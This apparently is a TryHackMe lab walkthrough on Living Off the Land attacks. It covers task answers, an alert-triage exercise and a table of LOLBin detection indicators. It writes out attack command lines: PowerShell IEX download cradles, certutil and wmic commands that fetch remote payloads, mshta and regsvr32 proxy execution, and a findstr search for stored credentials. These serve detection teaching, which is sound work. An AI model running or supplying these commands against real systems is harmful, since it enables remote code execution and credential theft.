---
title: Living Off the Land Attacks Walkthrough
description: Understand how attackers abuse legitimate built-in system tools and how to detect them.
pubDate: 2026-11-03
categories:
  - SOC
  - Walkthrough
  - TryHackMe
  - Network
tags:
  - Lessons
image: /image/networksecess.png
---
---
## Summary

In this room, we look at **Living Off the Land (LotL)** attacks, where adversaries abuse legitimate, pre-installed system binaries (LOLBins on Windows and GTFOBins on Linux) and signed admin utilities (`Sysinternals`) to blend in with normal administrative traffic. We review real-world examples like APT29's fileless WMI Event Subscriptions (`T1546.003`) and Cobalt Strike `SMB` beacons, examine high-risk PowerShell (`IEX`) and `wmic process call create` command lines, and complete the practical alert triage exercise by separating malicious LOLBin abuse from routine admin operations.

---

**Learning Objectives**

- Understand what Living Off the Land (LotL) attacks are and why adversaries choose them
- Identify legitimate built-in tools that can be abused
- Recognize attacker techniques that blend into normal system administration operations
- Detect LotL behavior using log analysis, command-line tracking, and SIEM alerts

---
## Task 1.1
*Which public site lists Unix/Linux native binaries and how they can be abused?*

**Answer**: `GTFOBins`

**Why?**
While **LOLBAS** documents Living Off The Land Binaries and Scripts for Windows, **GTFOBins** is the public community-curated catalog that documents native Unix and Linux binaries and how attackers can abuse them for shell breakouts, privilege escalation, and file transfers.

![](../../assets/Pasted%20image%2020261111144546.png)

## Task 1.2
*Which Microsoft toolset includes PsExec and Autoruns, used for admin tasks and often misused by attackers?*

**Answer**: `Sysinternals`

**Why?**
Microsoft's **Sysinternals** suite includes signed administrative utilities like `PsExec` (for remote execution) and `Autoruns` (for persistence inspection and manipulation) that threat actors frequently abuse because they are trusted and blend into normal admin workflows.

![](../../assets/Pasted%20image%2020261111144741.png)

## Task 2.1
*What MITRE technique ID covers WMI event subscriptions?*

**Answer**: `T1546.003`

**Why?**
Following the MITRE ATT&CK link in the **APT29 (Nobelium) - PowerShell and WMI for Persistence and Execution** section shows that **Event Triggered Execution: Windows Management Instrumentation Event Subscription** has the sub-technique ID **`T1546.003`**.

![](../../assets/Pasted%20image%2020261111144947.png)
![](../../assets/Pasted%20image%2020261111144952.png)

## Task 2.2
*Which abbreviated name refers to one of the services that C2s, like Cobalt Strike, use to start or listen for remote services?*

**Answer**: `SMB`

**Why?**
Checking the Cobalt Strike **Peer2Peer Listeners** documentation shows that beacons communicate laterally across internal hosts using **TCP** or **`SMB`** named-pipe beacons (`link [target] [pipe]`), allowing internal beacons to relay commands without reaching out to the external C2 server directly.

![](../../assets/Pasted%20image%2020261111150240.png)
![](../../assets/Pasted%20image%2020261111150216.png)

## Task 3.1
*Which PowerShell switch is used to download text/strings and execute them?*

**Answer**: `IEX`

**Why?**
In PowerShell download cradles (`powershell -NoP -NonI -W Hidden -Exec Bypass -Command "IEX (New-Object System.Net.WebClient).DownloadString('http://...')"`) the **`IEX`** (`Invoke-Expression`) cmdlet takes the downloaded script string and immediately executes it in memory.

![](../../assets/Pasted%20image%2020261111150342.png)

## Task 3.2
*Which WMIC keyword triggers the creation of a new process on a remote host?*

**Answer**: `create`

**Why?**
When abusing `WMIC` for local or remote process execution (`wmic /node:TARGETHOST process call create "powershell ..."`), the **`create`** keyword is what instructs WMI to spawn the new process.

![](../../assets/Pasted%20image%2020261111150516.png)

## Task 4.1
*Label each alert as malicious or not malicious in the Alert Review simulator and click Finish Analysis.*

**Answer**: `6 Malicious / 4 Not Malicious`

**Why?**
In the **Living Off The Land - Alert Review** simulator, we inspect the full command line and execution context of all 10 alerts:
- **Malicious (6 alerts)**:
  1. `Certutil download to Public: certutil -urlcache -split -f "https://downloads.tryhatme.com/agents/agent.exe" C:\Users\Public\agent.exe` -> Abusing `certutil.exe` as a downloader to drop an executable in `C:\Users\Public\`.
  2. `PowerShell IEX DownloadString: powershell -NoP -NonI -W Hidden -Exec Bypass -Command "IEX (New-Object System.Net.WebClient).DownloadString('https://updates.tryhackme.com/content/payload.ps1')"` -> Classic hidden PowerShell fileless download cradle.
  3. `Rundll32 executing temp DLL export: rundll32.exe C:\Windows\Temp\thm_loader.dll,Run` -> Abusing `rundll32.exe` to execute an unverified DLL staged in `C:\Windows\Temp\`.
  4. `MSHTA inline JavaScript spawning PowerShell: mshta "javascript:var s=new ActiveXObject('WScript.Shell');s.Run('powershell -NoP -W Hidden -Command \"Start-Process calc.exe\"',0);close();"` -> Proxy execution via `mshta.exe` running inline JavaScript to spawn hidden PowerShell.
  5. `WMIC remote process create: wmic /node:WIN-LAB-01 process call create "powershell -NoP -Command IEX(New-Object Net.WebClient).DownloadString('http://cdn.tryhatme.com/assets/bootstrap.ps1')"` -> Lateral movement via `wmic` remote process creation pulling an external PowerShell script.
  6. `PowerShell -EncodedCommand observed: powershell -NoP -NonI -EncodedCommand SQBnAHYAZQBSA...` -> Obfuscated Base64 command execution with non-interactive and no-profile flags.
- **Not Malicious (4 alerts)**:
  1. `Administrator executed: cmd.exe /c dir C:\Windows\Temp` -> Benign directory listing by an administrator.
  2. `User launched Notepad: C:\Windows\System32\notepad.exe` -> Normal interactive application launch.
  3. `Disk cleanup initiated by user: cleanmgr.exe /sagerun:1` -> Standard Windows disk cleanup utility.
  4. `Scheduled backup using: backup.exe /create` -> Routine scheduled backup job.

![](../../assets/Pasted%20image%2020261111150637.png)
![](../../assets/Pasted%20image%2020261111151056.png)
![](../../assets/Pasted%20image%2020261111151106.png)
![](../../assets/Pasted%20image%2020261111151115.png)

---

## Personal Note: Common Windows LOLBins & Detection Indicators

Quick summary of the Living-off-the-Land binaries (LOLBins) covered in the lesson and what makes their command lines stand out in logs:

| LOLBin | Legitimate Purpose | Malicious Abuse Pattern | What to Look For in Command Lines |
| :--- | :--- | :--- | :--- |
| **`certutil.exe`** | Manage certificates and CA configs | File encoding/decoding and downloading payloads from C2 | - `-encode` / `-decode` (obfuscating scripts/binaries)<br>- `-urlcache -split -f http...` (downloading payloads to `Temp` or `Public`) |
| **`mshta.exe`** | Execute Microsoft HTML Applications (`.hta`) | Proxy execution of remote `.hta` payloads or inline scripts | - `mshta.exe http://...`<br>- `mshta "javascript:..."` or `vbscript:Execute(...)` spawning `powershell.exe` |
| **`regsvr32.exe`** | Register/unregister COM DLLs in the registry | **Squiblydoo** (`T1218.010`) scriptlet execution bypassing AppLocker | - `/s /n /u /i:http://.../payload.sct scrobj.dll` |
| **`rundll32.exe`** | Execute functions exported by DLLs | Running malicious DLL exports or inline `javascript:` payloads | - `rundll32.exe C:\Windows\Temp\<file>.dll,<Export>`<br>- `rundll32.exe D:\review.dat,DllRegisterServer` |
| **`wmic.exe`** | WMI command-line administration | Local or lateral remote process creation | - `wmic /node:<HOST> process call create "powershell ..."` |
| **`powershell.exe`** | System automation & scripting | Fileless download cradles and Base64 execution | - `-NoP -NonI -W Hidden -Exec Bypass`<br>- `IEX (New-Object Net.WebClient).DownloadString(...)`<br>- `-enc` / `-EncodedCommand` |
| **`findstr.exe`** | Search text patterns in files | Hunting for stored credentials in SYSVOL / Group Policy Preferences | - `findstr /S /I cpassword \\<domain>\sysvol\*.xml` |
